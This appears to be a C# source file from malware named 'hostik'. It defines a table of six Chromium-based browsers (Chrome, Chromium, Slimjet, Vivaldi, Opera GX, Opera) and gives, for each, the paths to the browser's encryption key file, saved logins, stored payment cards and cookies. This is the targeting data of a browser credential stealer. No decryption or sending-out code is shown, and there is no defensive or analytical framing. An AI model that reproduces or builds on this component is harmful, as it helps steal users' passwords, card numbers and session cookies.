using System;
using System.Collections.Generic;

namespace hostik;

internal class BL
{
	public List<BI> Browsers = new List<BI>
	{
		new BI
		{
			Name = "Google Chrome",
			KeyPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
		},
		new BI
		{
			Name = "Chromium",
			KeyPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Chromium\\User Data\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Cookies"
		},
		new BI
		{
			Name = "Slimjet",
			KeyPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Slimjet\\User Data\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Slimjet\\User Data\\Default\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Slimjet\\User Data\\Default\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Slimjet\\User Data\\Default\\Cookies"
		},
		new BI
		{
			Name = "Vivaldi",
			KeyPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Cookies"
		},
		new BI
		{
			Name = "Opera GX",
			KeyPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera GX Stable\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera GX Stable\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera GX Stable\\Cookies"
		},
		new BI
		{
			Name = "Opera",
			KeyPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\Local State",
			LoginsPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data",
			CardsPath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\Web Data",
			CookiePath = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\Cookies"
		}
	};
}
